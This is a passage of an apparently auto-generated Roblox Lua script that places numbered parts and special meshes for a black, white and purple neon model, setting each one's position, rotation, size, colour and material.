Part419.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part419.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part419.BrickColor = BrickColor.new("Really black")
Part419.CanCollide = false
Part419.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part419.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part419.Material = Enum.Material.Metal
Part419.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part419.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part419.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part419.brickColor = BrickColor.new("Really black")
SpecialMesh420.Parent = Part419
SpecialMesh420.Scale = Vector3.new(0.5, 1, 0.25)
SpecialMesh420.MeshType = Enum.MeshType.Brick
Part421.Parent = Model0
Part421.CFrame = CFrame.new(-0.610599458, 3.09770298, -14.5984182, -0.999985635, 0.00510674436, -0.0016279578, -0.00513667939, -0.999807417, 0.0189470276, -0.00153088616, 0.018955119, 0.999819279)
Part421.Orientation = Vector3.new(-1.09000003, -0.0899999961, -179.709991)
Part421.Position = Vector3.new(-0.610599458, 3.09770298, -14.5984182)
Part421.Rotation = Vector3.new(-1.09000003, -0.0899999961, -179.709991)
Part421.Color = Color3.new(0.972549, 0.972549, 0.972549)
Part421.Velocity = Vector3.new(8.1124405e-08, 0.00246563042, 1.06606149e-06)
Part421.Size = Vector3.new(0.275000006, 0.200124964, 0.287375033)
Part421.Anchored = true
Part421.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part421.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part421.BrickColor = BrickColor.new("Institutional white")
Part421.CanCollide = false
Part421.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part421.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part421.Material = Enum.Material.Metal
Part421.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part421.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part421.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part421.brickColor = BrickColor.new("Institutional white")
SpecialMesh422.Parent = Part421
SpecialMesh422.Scale = Vector3.new(0.560000002, 1, 0.899999976)
SpecialMesh422.MeshType = Enum.MeshType.Wedge
Part423.Parent = Model0
Part423.CFrame = CFrame.new(-0.608857095, 2.56135106, -13.9388657, -0.999985635, -0.00289438874, -0.00451127253, -0.00513661513, 0.277069688, 0.960836291, -0.00153109606, 0.96084559, -0.277080595)
Part423.Orientation = Vector3.new(-73.909996, -179.069992, -1.05999994)
Part423.Position = Vector3.new(-0.608857095, 2.56135106, -13.9388657)
Part423.Rotation = Vector3.new(-106.089996, -0.25999999, 179.830002)
Part423.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part423.Velocity = Vector3.new(1.66171404e-07, 0.00246700505, 2.18366995e-06)
Part423.Size = Vector3.new(0.275000006, 0.409124941, 0.360375017)
Part423.Anchored = true
Part423.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part423.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part423.BrickColor = BrickColor.new("Really black")
Part423.CanCollide = false
Part423.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part423.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part423.Material = Enum.Material.Metal
Part423.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part423.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part423.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part423.brickColor = BrickColor.new("Really black")
SpecialMesh424.Parent = Part423
SpecialMesh424.Scale = Vector3.new(0.349999994, 1, 1)
SpecialMesh424.MeshType = Enum.MeshType.Brick
Part425.Parent = Model0
Part425.CFrame = CFrame.new(-0.610883415, 2.94288707, -13.8941879, -0.999985635, -0.00162807154, -0.00510650687, -0.00513644237, 0.0189459547, 0.999807417, -0.00153100991, 0.999819279, -0.0189540461)
Part425.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part425.Position = Vector3.new(-0.610883415, 2.94288707, -13.8941879)
Part425.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part425.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part425.Velocity = Vector3.new(1.05672896e-07, 0.00246709795, 1.38865482e-06)
Part425.Size = Vector3.new(0.275000006, 0.228, 0.213375002)
Part425.Anchored = true
Part425.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part425.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part425.BrickColor = BrickColor.new("Really black")
Part425.CanCollide = false
Part425.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part425.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part425.Material = Enum.Material.Metal
Part425.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part425.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part425.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part425.brickColor = BrickColor.new("Really black")
SpecialMesh426.Parent = Part425
SpecialMesh426.Scale = Vector3.new(0.569999993, 0.125, 0.375)
SpecialMesh426.MeshType = Enum.MeshType.Wedge
Part427.Parent = Model0
Part427.CFrame = CFrame.new(-0.612252593, 3.11727381, -13.584939, -0.999985635, -0.00162807154, -0.00510656228, -0.00513649778, 0.0189459547, 0.999807417, -0.00153100886, 0.999819279, -0.0189540461)
Part427.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part427.Position = Vector3.new(-0.612252593, 3.11727381, -13.584939)
Part427.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part427.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part427.Velocity = Vector3.new(7.80211593e-08, 0.00246774196, 1.02528122e-06)
Part427.Size = Vector3.new(0.275000006, 0.398124993, 0.303375006)
Part427.Anchored = true
Part427.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part427.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part427.BrickColor = BrickColor.new("Really black")
Part427.CanCollide = false
Part427.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part427.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part427.Material = Enum.Material.Metal
Part427.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part427.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part427.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part427.brickColor = BrickColor.new("Really black")
SpecialMesh428.Parent = Part427
SpecialMesh428.Scale = Vector3.new(0.5, 1, 1)
SpecialMesh428.MeshType = Enum.MeshType.Brick
Part429.Parent = Model0
Part429.CFrame = CFrame.new(-0.612551332, 3.35195827, -14.1766062, 0.999985635, 0.0047621401, -0.00246015727, 0.00513686566, -0.720367908, 0.693573296, 0.00153067405, -0.693575978, -0.720381975)
Part429.Orientation = Vector3.new(-43.9099998, -179.800003, 179.589996)
Part429.Position = Vector3.new(-0.612551332, 3.35195827, -14.1766062)
Part429.Rotation = Vector3.new(-136.089996, -0.140000001, -0.269999981)
Part429.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part429.Velocity = Vector3.new(4.08082492e-08, 0.00246650912, 5.36263883e-07)
Part429.Size = Vector3.new(0.275000006, 0.331124961, 0.412375003)
Part429.Anchored = true
Part429.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part429.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part429.BrickColor = BrickColor.new("Really black")
Part429.CanCollide = false
Part429.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part429.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part429.Material = Enum.Material.Metal
Part429.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part429.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part429.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part429.brickColor = BrickColor.new("Really black")
SpecialMesh430.Parent = Part429
SpecialMesh430.Scale = Vector3.new(0.5, 1.04999995, 0.5)
SpecialMesh430.MeshType = Enum.MeshType.Brick
Part431.Parent = Model0
Part431.CFrame = CFrame.new(-0.578086436, 2.53643656, -13.5418949, -0.00476215873, 0.999985635, -0.00245991186, 0.72036773, 0.00513670826, 0.693573475, 0.693576157, 0.00153086532, -0.720381796)
Part431.Orientation = Vector3.new(-43.9099998, -179.800003, 89.5899963)
Part431.Position = Vector3.new(-0.578086436, 2.53643656, -13.5418949)
Part431.Rotation = Vector3.new(-136.089996, -0.140000001, -90.2699966)
Part431.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part431.Velocity = Vector3.new(1.70122007e-07, 0.00246783718, 2.23558482e-06)
Part431.Size = Vector3.new(0.421999991, 0.200000003, 0.280375004)
Part431.Anchored = true
Part431.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part431.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part431.BrickColor = BrickColor.new("Royal purple")
Part431.CanCollide = false
Part431.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part431.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part431.Material = Enum.Material.Neon
Part431.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part431.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part431.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part431.brickColor = BrickColor.new("Royal purple")
SpecialMesh432.Parent = Part431
SpecialMesh432.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh432.MeshType = Enum.MeshType.Wedge
Part433.Parent = Model0
Part433.CFrame = CFrame.new(-0.647041559, 3.82817221, -13.658843, -0.00162801228, -0.999985635, 0.00510653481, 0.0189460143, -0.00513646938, -0.999807417, 0.999819279, -0.00153094972, 0.0189541057)
Part433.Orientation = Vector3.new(88.8799973, 15.0799999, 105.169998)
Part433.Position = Vector3.new(-0.647041559, 3.82817221, -13.658843)
Part433.Rotation = Vector3.new(88.909996, 0.289999992, 90.0899963)
Part433.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part433.Velocity = Vector3.new(-3.47029321e-08, 0.00246758247, -4.56033831e-07)
Part433.Size = Vector3.new(0.643000007, 0.200000003, 0.280375004)
Part433.Anchored = true
Part433.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part433.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part433.BrickColor = BrickColor.new("Royal purple")
Part433.CanCollide = false
Part433.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part433.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part433.Material = Enum.Material.Neon
Part433.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part433.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part433.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part433.brickColor = BrickColor.new("Royal purple")
SpecialMesh434.Parent = Part433
SpecialMesh434.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh434.MeshType = Enum.MeshType.Wedge
Part435.Parent = Model0
Part435.CFrame = CFrame.new(-0.610847712, 3.10699439, -14.4674244, 0.999985635, 0.00345827825, -0.00409521349, 0.00513684051, -0.400113374, 0.916451454, 0.00153079373, -0.916459262, -0.400125414)
Part435.Orientation = Vector3.new(-66.409996, -179.409988, 179.259995)
Part435.Position = Vector3.new(-0.610847712, 3.10699439, -14.4674244)
Part435.Rotation = Vector3.new(-113.589996, -0.229999989, -0.199999988)
Part435.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part435.Velocity = Vector3.new(7.96511017e-08, 0.00246590329, 1.04670062e-06)
Part435.Size = Vector3.new(0.275000006, 0.23712492, 0.375375003)
Part435.Anchored = true
Part435.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part435.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part435.BrickColor = BrickColor.new("Royal purple")
Part435.CanCollide = false
Part435.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part435.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part435.Material = Enum.Material.Neon
Part435.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part435.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part435.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part435.brickColor = BrickColor.new("Royal purple")
SpecialMesh436.Parent = Part435
SpecialMesh436.Scale = Vector3.new(0.524999976, 1.04999995, 0.800000012)
SpecialMesh436.MeshType = Enum.MeshType.Brick
Part437.Parent = Model0
Part437.CFrame = CFrame.new(-0.583012402, 3.6639781, -14.1030874, 0.00476215919, 0.999985635, 0.00246015075, -0.720367849, 0.0051368745, -0.693573356, -0.693576038, 0.00153069268, 0.720381975)
Part437.Orientation = Vector3.new(43.9099998, 0.199999988, -89.5899963)
Part437.Position = Vector3.new(-0.583012402, 3.6639781, -14.1030874)
Part437.Rotation = Vector3.new(43.9099998, 0.140000001, -89.7299957)
Part437.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part437.Velocity = Vector3.new(-8.66738503e-09, 0.00246666698, -1.13898864e-07)
Part437.Size = Vector3.new(0.496000022, 0.200000003, 0.280375004)
Part437.Anchored = true
Part437.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part437.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part437.BrickColor = BrickColor.new("Royal purple")
Part437.CanCollide = false
Part437.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part437.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part437.Material = Enum.Material.Neon
Part437.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part437.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part437.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part437.brickColor = BrickColor.new("Royal purple")
SpecialMesh438.Parent = Part437
SpecialMesh438.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh438.MeshType = Enum.MeshType.Wedge
Part439.Parent = Model0
Part439.CFrame = CFrame.new(-0.609243929, 2.84955072, -14.6524963, -0.999985635, -0.00162816211, -0.00510652829, -0.00513646565, 0.0189461932, 0.999807417, -0.00153109885, 0.999819279, -0.0189542845)
Part439.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part439.Position = Vector3.new(-0.609243929, 2.84955072, -14.6524963)
Part439.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part439.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part439.Velocity = Vector3.new(1.20472833e-07, 0.00246551796, 1.58314185e-06)
Part439.Size = Vector3.new(0.275000006, 0.287124902, 0.227375031)
Part439.Anchored = true
Part439.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part439.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part439.BrickColor = BrickColor.new("Really black")
Part439.CanCollide = false
Part439.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part439.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part439.Material = Enum.Material.Metal
Part439.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part439.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part439.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part439.brickColor = BrickColor.new("Really black")
SpecialMesh440.Parent = Part439
SpecialMesh440.Scale = Vector3.new(0.349999994, 1, 1)
SpecialMesh440.MeshType = Enum.MeshType.Brick
Part441.Parent = Model0
Part441.CFrame = CFrame.new(-0.610548377, 2.83942795, -13.765955, -0.999985635, -0.00162816129, -0.00510662561, -0.00513656298, 0.0189460143, 0.999807417, -0.00153109711, 0.999819279, -0.0189541057)
Part441.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part441.Position = Vector3.new(-0.610548377, 2.83942795, -13.765955)
Part441.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part441.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part441.Velocity = Vector3.new(1.22077964e-07, 0.002467365, 1.60423497e-06)
Part441.Size = Vector3.new(0.275000006, 0.304124922, 0.267374992)
Part441.Anchored = true
Part441.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part441.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part441.BrickColor = BrickColor.new("Really black")
Part441.CanCollide = false
Part441.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part441.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part441.Material = Enum.Material.Metal
Part441.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part441.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part441.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part441.brickColor = BrickColor.new("Really black")
SpecialMesh442.Parent = Part441
SpecialMesh442.Scale = Vector3.new(0.495000005, 1, 1)
SpecialMesh442.MeshType = Enum.MeshType.Wedge
Part443.Parent = Model0
Part443.CFrame = CFrame.new(-0.584542513, 3.82849336, -13.6587467, 0.00162807188, 0.999985635, 0.00510653481, -0.0189460143, 0.00513647031, -0.999807417, -0.999819279, 0.00153100933, 0.0189541057)
Part443.Orientation = Vector3.new(88.8799973, 15.0799999, -74.8300018)
Part443.Position = Vector3.new(-0.584542513, 3.82849336, -13.6587467)
Part443.Rotation = Vector3.new(88.909996, 0.289999992, -89.909996)
Part443.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part443.Velocity = Vector3.new(-3.47538496e-08, 0.00246759271, -4.56702992e-07)
Part443.Size = Vector3.new(0.643000007, 0.200000003, 0.280375004)
Part443.Anchored = true
Part443.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part443.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part443.BrickColor = BrickColor.new("Royal purple")
Part443.CanCollide = false
Part443.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part443.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part443.Material = Enum.Material.Neon
Part443.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part443.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part443.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part443.brickColor = BrickColor.new("Royal purple")
SpecialMesh444.Parent = Part443
SpecialMesh444.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh444.MeshType = Enum.MeshType.Wedge
Part445.Parent = Model0
Part445.CFrame = CFrame.new(-0.618139863, 3.39627433, -10.6743059, 0.999985635, -0.0024899696, 0.00474630948, 0.00513651408, 0.192273051, -0.981328189, 0.00153088931, 0.981338441, 0.192283079)
Part445.Orientation = Vector3.new(78.909996, 1.40999997, 1.52999997)
Part445.Position = Vector3.new(-0.618139863, 3.39627433, -10.6743059)
Part445.Rotation = Vector3.new(78.909996, 0.269999981, 0.140000001)
Part445.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part445.Velocity = Vector3.new(3.37812835e-08, 0.00247380603, 4.43921522e-07)
Part445.Size = Vector3.new(0.275000006, 0.28125, 0.234375)
Part445.Anchored = true
Part445.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part445.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part445.BrickColor = BrickColor.new("Really black")
Part445.CanCollide = false
Part445.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part445.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part445.Material = Enum.Material.Metal
Part445.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part445.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part445.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part445.brickColor = BrickColor.new("Really black")
SpecialMesh446.Parent = Part445
SpecialMesh446.Scale = Vector3.new(0.5, 1.04999995, 0.400000006)
SpecialMesh446.MeshType = Enum.MeshType.Brick
Part447.Parent = Model0
Part447.CFrame = CFrame.new(-0.612165928, 3.04279852, -13.3917465, -0.999985635, -0.00162807154, -0.00510656228, -0.00513649778, 0.0189459547, 0.999807417, -0.00153100886, 0.999819279, -0.0189540461)
Part447.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part447.Position = Vector3.new(-0.612165928, 3.04279852, -13.3917465)
Part447.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part447.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part447.Velocity = Vector3.new(8.98303796e-08, 0.00246814452, 1.18046705e-06)
Part447.Size = Vector3.new(0.275000006, 0.577124953, 0.303375006)
Part447.Anchored = true
Part447.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part447.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part447.BrickColor = BrickColor.new("Really black")
Part447.CanCollide = false
Part447.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part447.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part447.Material = Enum.Material.Metal
Part447.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part447.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part447.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part447.brickColor = BrickColor.new("Really black")
SpecialMesh448.Parent = Part447
SpecialMesh448.Scale = Vector3.new(0.400000006, 0.870000005, 0.5)
SpecialMesh448.MeshType = Enum.MeshType.Brick
Part449.Parent = Model0
Part449.CFrame = CFrame.new(-0.576728344, 2.5984447, -14.6364422, 0.00114334025, 0.999985635, -0.00523668947, -0.483495861, 0.00513671385, 0.8753317, 0.875346005, 0.00153111527, 0.483494759)
Part449.Orientation = Vector3.new(-61.079998, -0.620000005, -89.3899994)
Part449.Position = Vector3.new(-0.576728344, 2.5984447, -14.6364422)
Part449.Rotation = Vector3.new(-61.0900002, -0.299999982, -89.9300003)
Part449.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part449.Velocity = Vector3.new(1.6028963e-07, 0.00246555661, 2.10637722e-06)
Part449.Size = Vector3.new(0.423000038, 0.200000003, 0.280375004)
Part449.Anchored = true
Part449.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part449.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part449.BrickColor = BrickColor.new("Royal purple")
Part449.CanCollide = false
Part449.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part449.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part449.Material = Enum.Material.Neon
Part449.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part449.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part449.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part449.brickColor = BrickColor.new("Royal purple")
SpecialMesh450.Parent = Part449
SpecialMesh450.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh450.MeshType = Enum.MeshType.Wedge
Part451.Parent = Model0
Part451.CFrame = CFrame.new(-0.611472607, 3.24456573, -14.520874, -0.999985635, 0.000250921701, 0.00535428664, -0.00513683865, 0.240468413, -0.970643461, -0.00153109187, -0.970656991, -0.240463659)
Part451.Orientation = Vector3.new(76.0800018, 178.720001, -1.22000003)
Part451.Position = Vector3.new(-0.611472607, 3.24456573, -14.520874)
Part451.Rotation = Vector3.new(103.909996, 0.310000002, -179.98999)
Part451.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part451.Velocity = Vector3.new(5.78370134e-08, 0.002465792, 7.60040166e-07)
Part451.Size = Vector3.new(0.275000006, 0.221124932, 0.408374965)
Part451.Anchored = true
Part451.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part451.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part451.BrickColor = BrickColor.new("Really black")
Part451.CanCollide = false
Part451.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part451.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part451.Material = Enum.Material.Metal
Part451.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part451.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part451.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part451.brickColor = BrickColor.new("Really black")
SpecialMesh452.Parent = Part451
SpecialMesh452.Scale = Vector3.new(0.550000012, 1.04999995, 0.800000012)
SpecialMesh452.MeshType = Enum.MeshType.Brick
Part453.Parent = Model0
Part453.CFrame = CFrame.new(-0.610993803, 3.15083313, -14.5190973, 0.999985635, 0.00289416499, -0.00451159757, 0.00513686473, -0.2770693, 0.960836351, 0.00153079326, -0.960845709, -0.277080178)
Part453.Orientation = Vector3.new(-73.909996, -179.069992, 178.940002)
Part453.Position = Vector3.new(-0.610993803, 3.15083313, -14.5190973)
Part453.Rotation = Vector3.new(-106.089996, -0.25999999, -0.170000002)
Part453.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part453.Velocity = Vector3.new(7.26997911e-08, 0.00246579573, 9.55352903e-07)
Part453.Size = Vector3.new(0.275000006, 0.221124932, 0.408374965)
Part453.Anchored = true
Part453.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part453.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part453.BrickColor = BrickColor.new("Really black")
Part453.CanCollide = false
Part453.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part453.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part453.Material = Enum.Material.Metal
Part453.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part453.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part453.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part453.brickColor = BrickColor.new("Really black")
SpecialMesh454.Parent = Part453
SpecialMesh454.Scale = Vector3.new(0.550000012, 1.04999995, 0.800000012)
SpecialMesh454.MeshType = Enum.MeshType.Brick
Part455.Parent = Model0
Part455.CFrame = CFrame.new(-0.609657764, 2.72515392, -13.9643335, -0.999985635, -0.00162816129, -0.00510662561, -0.00513656298, 0.0189460143, 0.999807417, -0.00153109711, 0.999819279, -0.0189541057)
Part455.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part455.Position = Vector3.new(-0.609657764, 2.72515392, -13.9643335)
Part455.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part455.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part455.Velocity = Vector3.new(1.40197898e-07, 0.00246695196, 1.84235034e-06)
Part455.Size = Vector3.new(0.275000006, 0.330124915, 0.226374999)
Part455.Anchored = true
Part455.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part455.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part455.BrickColor = BrickColor.new("Really black")
Part455.CanCollide = false
Part455.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part455.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part455.Material = Enum.Material.Glass
Part455.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part455.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part455.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part455.brickColor = BrickColor.new("Really black")
SpecialMesh456.Parent = Part455
SpecialMesh456.Scale = Vector3.new(0.400000006, 1, 1)
SpecialMesh456.MeshType = Enum.MeshType.Brick
Part457.Parent = Model0
Part457.CFrame = CFrame.new(-0.577368915, 2.78939152, -14.8586674, 0.00361127499, 0.999985635, -0.00396134611, -0.85638535, 0.00513800606, 0.516312063, 0.516324997, 0.00152789324, 0.856391609)
Part457.Orientation = Vector3.new(-31.0900002, -0.269999981, -89.659996)
Part457.Position = Vector3.new(-0.577368915, 2.78939152, -14.8586674)
Part457.Rotation = Vector3.new(-31.0900002, -0.229999989, -89.7900009)
Part457.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part457.Velocity = Vector3.new(1.30012012e-07, 0.00246509351, 1.70849694e-06)
Part457.Size = Vector3.new(0.293000042, 0.200000003, 0.280375004)
Part457.Anchored = true
Part457.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part457.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part457.BrickColor = BrickColor.new("Royal purple")
Part457.CanCollide = false
Part457.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part457.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part457.Material = Enum.Material.Neon
Part457.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part457.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part457.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part457.brickColor = BrickColor.new("Royal purple")
SpecialMesh458.Parent = Part457
SpecialMesh458.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh458.MeshType = Enum.MeshType.Wedge
Part459.Parent = Model0
Part459.CFrame = CFrame.new(-0.611768007, 3.29040194, -14.4816895, -0.999985635, -0.00045009004, 0.00534120994, -0.00513681443, 0.36510545, -0.930952132, -0.00153109233, -0.930966198, -0.3651025)
Part459.Orientation = Vector3.new(68.5800018, 179.159988, -0.810000002)
Part459.Position = Vector3.new(-0.611768007, 3.29040194, -14.4816895)
Part459.Rotation = Vector3.new(111.409996, 0.310000002, 179.970001)
Part459.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part459.Velocity = Vector3.new(5.05689677e-08, 0.00246587349, 6.64530262e-07)
Part459.Size = Vector3.new(0.275000006, 0.238124937, 0.381375015)
